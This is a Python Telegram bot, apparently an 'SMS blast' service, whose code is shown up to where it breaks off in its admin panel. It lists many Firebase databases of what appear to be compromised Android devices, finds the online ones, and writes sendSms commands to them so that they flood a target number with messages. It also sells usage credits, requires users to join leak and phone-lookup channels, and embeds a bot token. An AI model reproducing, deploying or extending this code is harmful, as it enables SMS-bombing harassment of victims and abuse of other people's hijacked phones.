#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════
#  SMS BLAST BOT — FULL WORKING · RAILWAY READY · v3.5-HACKERX
# ═══════════════════════════════════════════════════════════════════
import sys, subprocess, importlib.util, os

REQUIRED_PACKAGES = {"aiogram": "aiogram", "aiohttp": "aiohttp"}

def _ensure_packages():
    missing = [pip for mod, pip in REQUIRED_PACKAGES.items() if importlib.util.find_spec(mod) is None]
    if not missing:
        print("[✓] All dependencies present.")
        return
    print(f"[*] Installing missing packages: {', '.join(missing)}")
    for pkg in missing:
        try:
            print(f"    → pip install {pkg}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-U", pkg],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            print(f"[✓] {pkg} installed")
        except subprocess.CalledProcessError as e:
            print(f"[✗] Failed to install {pkg}: {e}"); sys.exit(1)
    importlib.invalidate_caches()
    print("[✓] All dependencies ready.\n")

_ensure_packages()

import asyncio, json, time, logging, random, string, threading, traceback as _tb
from datetime import datetime

import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
                           ReplyKeyboardMarkup, KeyboardButton, FSInputFile)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("BlastBot")

# ═══════════════════════════════════════════════════════════════════
#  PREMIUM EMOJI IDs
# ═══════════════════════════════════════════════════════════════════
EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789")

def sc(text): return text.translate(SMALL_CAPS_MAP)
def em(eid, fb="⭐"):
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>' if eid else fb

def btn(text, cb, eid=None, fbemoji=""):
    label = f"{fbemoji} {sc(text)}".strip() if (fbemoji and not eid) else sc(text)
    return InlineKeyboardButton(text=label, callback_data=cb, icon_custom_emoji_id=eid) if eid else InlineKeyboardButton(text=label, callback_data=cb)

def btn_url(text, url, eid=None, fbemoji=""):
    label = f"{fbemoji} {sc(text)}".strip() if (fbemoji and not eid) else sc(text)
    return InlineKeyboardButton(text=label, url=url, icon_custom_emoji_id=eid) if eid else InlineKeyboardButton(text=label, url=url)

# ═══════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════
MAIN_OWNER = 6426979067
SUPER_ADMIN_NAME = "@HACKERXWHITE"
SUPER_ADMIN_LINK = "https://t.me/HACKERXWHITE"
SUPPORT_GROUP_NAME = "OSINTMASTER"
SUPPORT_GROUP_LINK = "https://t.me/OSINTMASTER09"
SUPPORT_GROUP_ID = "-1004483741432"
SUPER_ADMINS = [6426979067, 8769965268]

BOT_TOKEN = os.getenv("BOT_TOKEN", "8446736192:AAFueI7FEBdz47TRyEoOc8r2akxZfT3eBkg")
LOG_CHANNEL_ID = -1004483741432

# Railway Volume use ho raha hai to /data rakho, warna plain filename
if os.path.isdir("/data"):
    _DATA_FILE = "/data/blast_data.json"
    _CRASH_LOG = "/data/blastbot_crash.log"
else:
    _DATA_FILE = "blast_data.json"
    _CRASH_LOG = "blastbot_crash.log"

MY_CHANNELS = [
    {"id": "-1004483741432", "link": "https://t.me/OSINTMASTER09",        "title": "OSINTMASTER"},
    {"id": "-1003030513943", "link": "https://t.me/numbertoinformation1", "title": "Number to Information"},
    {"id": "-1004295471175", "link": "https://t.me/BUILDWITHAPI",          "title": "Build With API"},
    {"id": "-1003995553773", "link": "https://t.me/the_leaker_cyber",      "title": "The Leaker Cyber"},
]

MY_FIREBASES = [
    "https://uffuuf-d1a3c-default-rtdb.firebaseio.com",
    "https://bali-7acc3-default-rtdb.firebaseio.com",
    "https://sarita-setup-default-rtdb.firebaseio.com",
    "https://sunil-da-default-rtdb.firebaseio.com",
    "https://mustakbhai-798bd-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mithun-da-default-rtdb.firebaseio.com",
    "https://sk-paid-panel-default-rtdb.firebaseio.com",
    "https://crdio-3cf5c-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://dhiko0909-default-rtdb.firebaseio.com",
    "https://babuji-efd18-default-rtdb.firebaseio.com",
    "https://taetan-d810f-default-rtdb.firebaseio.com",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://flash-v8enginepower-default-rtdb.firebaseio.com",
    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
    "https://surajptiyanka-default-rtdb.firebaseio.com",
    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
    "https://blrm-c65dd-default-rtdb.firebaseio.com",
    "https://rojam-ff090-default-rtdb.firebaseio.com",
    "https://jdjfjiiii-default-rtdb.firebaseio.com",
    "https://whithex-741e0-default-rtdb.firebaseio.com",
    "https://maxjoker98-2cdfe-default-rtdb.firebaseio.com",
    "https://ayuuuu-11-default-rtdb.firebaseio.com",
    "https://jamesbondd5-default-rtdb.firebaseio.com",
]

_VERSION = "v3.5-HACKERX"
_PROGRESS_UPDATE_INTERVAL = 1.0
_BACKGROUND_SCAN_INTERVAL = 30.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

# ═══════════════════════════════════════════════════════════════════
#  SHARED SESSION + FILE LOCK
# ═══════════════════════════════════════════════════════════════════
_FILE_LOCK = threading.Lock()
_SHARED_SESSION = None

async def get_shared_session():
    global _SHARED_SESSION
    if _SHARED_SESSION is None or _SHARED_SESSION.closed:
        _SHARED_SESSION = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10))
    return _SHARED_SESSION

async def close_shared_session():
    global _SHARED_SESSION
    if _SHARED_SESSION and not _SHARED_SESSION.closed:
        await _SHARED_SESSION.close()

# ═══════════════════════════════════════════════════════════════════
#  CRASH LOG
# ═══════════════════════════════════════════════════════════════════
def _append_crash_log(header, tb_text):
    try:
        with open(_CRASH_LOG, "a", encoding="utf-8") as f:
            f.write(f"\n{'═' * 70}\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {header}\n{'═' * 70}\n{tb_text}\n")
    except Exception: pass

async def _report_crash_to_owner(bot, header, tb_text):
    try:
        body = tb_text.strip()[:3400].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        await bot.send_message(MAIN_OWNER,
            f"🚨 <b>BOT CRASH REPORT</b>\n\n<b>Where:</b> <code>{header}</code>\n"
            f"<b>Time:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"<pre>{body}</pre>", parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to report crash: {e}")

def _install_global_excepthook():
    def _hook(exc_type, exc_value, exc_tb):
        tb_text = "".join(_tb.format_exception(exc_type, exc_value, exc_tb))
        log.error(f"[UNCAUGHT] {exc_type.__name__}: {exc_value}\n{tb_text}")
        _append_crash_log(f"UNCAUGHT {exc_type.__name__}", tb_text)
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                asyncio.create_task(_report_crash_to_owner(Bot(token=BOT_TOKEN), "UNCAUGHT", tb_text))
        except Exception: pass
    sys.excepthook = _hook

def _install_asyncio_handler(loop):
    def _h(loop, context):
        exc = context.get("exception")
        msg = context.get("message", "no message")
        if exc:
            tb_text = "".join(_tb.format_exception(type(exc), exc, exc.__traceback__))
            header = f"ASYNCIO {type(exc).__name__}"
        else:
            tb_text = msg; header = "ASYNCIO"
        log.error(f"[{header}] {msg}\n{tb_text}")
        _append_crash_log(header, f"{msg}\n{tb_text}")
        try:
            if loop.is_running():
                asyncio.create_task(_report_crash_to_owner(Bot(token=BOT_TOKEN), header, tb_text))
        except Exception: pass
    loop.set_exception_handler(_h)

# ═══════════════════════════════════════════════════════════════════
#  FIRE EFFECT + CHANNEL LOG
# ═══════════════════════════════════════════════════════════════════
async def send_fire_effect_private(bot, chat_id):
    try:
        s = await get_shared_session()
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        async with s.post(url, json={"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}, timeout=5) as resp:
            res = await resp.json()
            if res.get("ok"):
                mid = res["result"]["message_id"]
                await asyncio.sleep(2)
                await s.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage",
                             json={"chat_id": chat_id, "message_id": mid})
    except Exception as e:
        log.warning(f"Fire Effect Failed: {e}")

async def send_channel_log(bot, text):
    try: await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e: log.error(f"Channel log failed: {e}")

# ═══════════════════════════════════════════════════════════════════
#  SESSION + GLOBALS
# ═══════════════════════════════════════════════════════════════════
class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number']
    def __init__(self, uid):
        self.uid = uid; self.cancelled = False
        self.sent = 0; self.failed = 0
        self.task = None; self.start_time = time.time()
        self.lock = asyncio.Lock(); self.number = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

# ═══════════════════════════════════════════════════════════════════
#  FSM STATES
# ═══════════════════════════════════════════════════════════════════
class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()

# ═══════════════════════════════════════════════════════════════════
#  STORAGE
# ═══════════════════════════════════════════════════════════════════
def _default_data():
    return {
        "owners": [MAIN_OWNER], "admins": [], "banned": [], "free_mode": False,
        "approved": [], "firebases": [], "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []}, "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {}, "activity_log": [],
        "protected_numbers": {}, "videos": []
    }

def load():
    global PROTECTED_NUMBERS
    data = None
    with _FILE_LOCK:
        if os.path.exists(_DATA_FILE):
            try:
                with open(_DATA_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
            except Exception as e:
                log.error(f"Load error: {e}")
        if data is None:
            data = _default_data()
            try:
                with open(_DATA_FILE, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
            except Exception as e:
                log.error(f"Init save error: {e}")

    if data is None: return _default_data()

    for k, v in _default_data().items():
        if k not in data: data[k] = v
    if MAIN_OWNER not in data.get("owners", []):
        data["owners"].insert(0, MAIN_OWNER)
    for uid_str, u in data.get("users", {}).items():
        if "credits" not in u: u["credits"] = 0
        if "sms_history" not in u: u["sms_history"] = []

    existing_urls = {fb["url"].rstrip("/") for fb in data.get("firebases", [])}
    changed = False
    for fb_url in MY_FIREBASES:
        clean = fb_url.rstrip("/")
        if clean not in existing_urls:
            fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
            label = clean.replace("https://", "").split(".")[0][:20]
            data["firebases"].append({"id": fb_id, "url": clean, "label": label, "added_at": int(time.time())})
            existing_urls.add(clean)
            changed = True

    fj = data.setdefault("force_join", {"enabled": False, "channels": []})
    existing_ch_ids = {str(c["id"]) for c in fj.get("channels", [])}
    for ch in MY_CHANNELS:
        if str(ch["id"]) not in existing_ch_ids:
            fj["channels"].append({"id": str(ch["id"]), "link": ch["link"],
                                   "title": ch["title"], "required": True})
            changed = True
    if changed:
        with _FILE_LOCK:
            try:
                with open(_DATA_FILE, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
            except Exception as e:
                log.error(f"Auto-save error: {e}")

    PROTECTED_NUMBERS = data.get("protected_numbers", {}) or {}
    return data

def save(d):
    with _FILE_LOCK:
        try:
            tmp = _DATA_FILE + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(d, f, indent=2, ensure_ascii=False)
            os.replace(tmp, _DATA_FILE)
        except Exception as e:
            log.error(f"Save error: {e}")

def reg_user(uid, name, d):
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {"name": name, "uses": 0, "credits": 0,
                          "joined_at": int(time.time()),
                          "refer_code": None, "referred_by": None, "sms_history": []}
        return True
    return False

def log_activity(d, action, uid, details=""):
    d.setdefault("activity_log", []).append({"timestamp": int(time.time()), "uid": uid,
                                              "action": action, "details": details})
    if len(d["activity_log"]) > 1000: d["activity_log"] = d["activity_log"][-1000:]

# ═══════════════════════════════════════════════════════════════════
#  ROLE / CREDIT HELPERS
# ═══════════════════════════════════════════════════════════════════
def is_main_owner(uid): return uid == MAIN_OWNER
def is_owner(uid, d): return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS
def is_admin(uid, d): return is_owner(uid, d) or uid in d.get("admins", [])
def is_banned(uid, d): return uid in d.get("banned", [])
def can_use(uid, d):
    if is_banned(uid, d): return False
    if is_admin(uid, d): return True
    if d.get("free_mode"): return True
    if uid in d.get("approved", []): return True
    return False

def role_tag(uid, d):
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid, d): return d.get("users", {}).get(str(uid), {}).get("credits", 0)
def add_credits(uid, amount, d):
    k = str(uid)
    if k not in d.get("users", {}): d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount
def deduct_credits(uid, amount, d):
    k = str(uid)
    if k in d.get("users", {}):
        cur = d["users"][k].get("credits", 0)
        if cur >= amount:
            d["users"][k]["credits"] = cur - amount; return True
    return False

def generate_user_refer_code(uid, d):
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if not any(u.get("refer_code") == code for u in d.get("users", {}).values()):
            break
    if k in d.get("users", {}): d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid, code, d):
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str); break
    if not referrer_uid: return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid: return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ɴᴀʜɪɴ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ!", None
    rc = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, rc, d); add_credits(referrer_uid, rc, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} +{rc} ᴄʀᴇᴅɪᴛs!", referrer_uid

async def send_random_video(bot, chat_id, caption=""):
    d = load(); videos = d.get("videos", [])
    if videos:
        try: await bot.send_video(chat_id, video=random.choice(videos), caption=caption, parse_mode="HTML")
        except Exception as e: log.error(f"Video send failed: {e}")

# ═══════════════════════════════════════════════════════════════════
#  UI HELPERS
# ═══════════════════════════════════════════════════════════════════
def kb(*rows): return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t, callback_data=c) for t, c in row] for row in rows])

def speed_kb(prefix):
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀"),
         btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡"),
         btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢")],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌")]])

def progress_bar(cur, total, width=20):
    if total <= 0: return "░" * width
    filled = min(width, int(width * cur / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent, failed, total, credits=None, speed_label="⚡ MEDIUM"):
    bar = progress_bar(sent + failed, total)
    pct = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
             f"{bar} <b>{pct}%</b>\n",
             f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
             f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
             f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent+failed}</b> / <b>{total}</b>",
             f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n"]
    if credits is not None: lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ.</i>")
    return "\n".join(lines)

def stop_send_kb():
    return InlineKeyboardMarkup(inline_keyboard=[[btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑")]])

def mask_number(n): return n if len(n) <= 4 else n[:2] + "******" + n[-4:]

def get_scan_status():
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
    if SCANNING_IN_PROGRESS: return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES: return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    dc = len(CACHED_DEVICES); td = time.time() - LAST_SCAN_TIME
    if td < 60: return f"{em(EMOJI_CHECK, '🟢')} {dc} ᴅᴇᴠɪᴄᴇs"
    if td < 300: return f"{em(EMOJI_WARNING, '🟡')} {dc} ᴅᴇᴠɪᴄᴇs ({int(td/60)}ᴍ)"
    return f"{em(EMOJI_CROSS, '🔴')} {dc} ᴅᴇᴠɪᴄᴇs ({int(td/60)}ᴍ)"

def fmt_time(ts): return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")
def fmt_duration(s): return f"{s}s" if s < 60 else f"{s//60}m {s%60}s"

# ═══════════════════════════════════════════════════════════════════
#  FIREBASE
# ═══════════════════════════════════════════════════════════════════
async def fb_get(base_url, path):
    url = base_url.rstrip("/") + path
    try:
        s = await get_shared_session()
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
            if r.status == 200:
                txt = (await r.text()).strip()
                if txt == "null" or not txt: return {}
                return json.loads(txt)
    except Exception as e: log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url, path, payload):
    url = base_url.rstrip("/") + path
    for i in range(3):
        try:
            s = await get_shared_session()
            async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                if 200 <= r.status < 300: return True
        except Exception as e: log.warning(f"fb_put {i+1}: {e}")
        await asyncio.sleep(0.5 * (i + 1))
    return False

def device_is_online(dd):
    return any([dd.get("isOnline"), dd.get("online"), dd.get("connected"),
                dd.get("status") in ("online", "active", True, 1)])

async def get_all_online_devices(d):
    fbs = d.get("firebases", [])
    if not fbs: return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    _sem = asyncio.Semaphore(15)

    async def fetch_one(fb):
        shallow = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            s = await get_shared_session()
            async with s.get(shallow, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200: return
                txt = (await r.text()).strip()
                if txt == "null" or not txt: return
                ids = json.loads(txt)
                if not isinstance(ids, dict): return

                async def fetch_dev(dev_id):
                    try:
                        url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                        async with _sem:
                            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                if r2.status == 200:
                                    t2 = (await r2.text()).strip()
                                    if t2 == "null" or not t2: return None
                                    dd = json.loads(t2)
                                    if isinstance(dd, dict) and device_is_online(dd):
                                        return {"fb_id": fb["id"], "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id,
                                                "dev_name": dd.get("deviceName") or dd.get("name") or dev_id[:16],
                                                "sims": dd.get("sims", [])}
                    except Exception as e: log.warning(f"Device {dev_id}: {e}")
                    return None

                dev_ids = list(ids.keys())
                for i in range(0, len(dev_ids), 20):
                    batch = dev_ids[i:i+20]
                    res = await asyncio.gather(*[fetch_dev(x) for x in batch])
                    for r in res:
                        if r: results.append(r)
        except Exception as e: log.warning(f"Shallow {fb['url']}: {e}")

    await asyncio.gather(*[fetch_one(fb) for fb in fbs])
    return results

async def send_sms_via_device(fb_url, dev_id, sim_slot, to, message):
    return await fb_put(fb_url, f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {"from": sim_slot, "to": to.strip(), "message": message.strip(),
         "isSended": False, "timestamp": int(time.time())})

# ═══════════════════════════════════════════════════════════════════
#  FORCE JOIN
# ═══════════════════════════════════════════════════════════════════
async def check_membership(bot, uid, channel_id):
    try:
        cid = int(str(channel_id).strip())
        m = await bot.get_chat_member(cid, uid)
        return m.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force join check failed: {e}"); return False

async def user_joined_all(bot, uid, d):
    if is_owner(uid, d): return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False): return True, []
    missing = []
    for ch in fj.get("channels", []):
        if ch.get("required", True) and not await check_membership(bot, uid, ch["id"]):
            missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing):
    lines = [f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n",
             f"{em(EMOJI_BELL, '👇')} ᴄʜᴀɴɴᴇʟs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"]
    for ch in missing: lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join ke baad /start karein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing):
    rows = []
    for ch in missing: rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ═══════════════════════════════════════════════════════════════════
#  PANEL TEXTS
# ═══════════════════════════════════════════════════════════════════
def owner_panel_text(d):
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    fj = d.get("force_join", {})
    fj_s = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    stats = d.get("stats", {})
    fb_lines = []
    for fb_id, fd in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fd.get("last_update", 0))
        st = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {st} {fd['label'][:20]}: {fd['online']}")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(d.get('owners', []))}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(d.get('admins', []))}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴜsᴇʀs         : <b>{len(d.get('users', {}))}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(d.get('videos', []))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} sᴇɴᴛ         : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ       : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ       : <b>{active}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴍᴏᴅᴇ         : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_s}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʟᴀɴs        : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ᴅʙ       :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━")

def admin_panel_text(d):
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    stats = d.get("stats", {})
    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴜsᴇʀs      : <b>{len(d.get('users', {}))}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs     : <b>{len(d.get('videos', []))}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ    : <b>{len(d.get('banned', []))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} sᴇɴᴛ      : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ    : <b>{stats.get('total_failed', 0)}</b>\n"
